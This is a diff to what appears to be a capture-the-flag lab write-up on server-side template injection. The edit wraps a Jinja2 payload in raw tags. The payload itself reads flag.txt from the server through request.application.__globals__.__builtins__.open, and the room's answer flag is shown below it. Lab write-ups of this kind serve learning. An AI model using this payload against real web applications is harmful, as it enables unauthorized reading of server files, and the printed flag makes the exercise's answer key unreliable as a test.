@@ -51,7 +51,9 @@ Input validation and sanitisation play a crucial role in preventing these types 
 
 Q: Perform an SSTI attack on the practical. You need to read the contents of flag.txt that is located within the same directory as the web application.
 
-`{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}`
+{% raw %}
+{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}
+{% endraw %}
 
 A: ` THM{SSTI_FLAG_OBTAINED} `
 
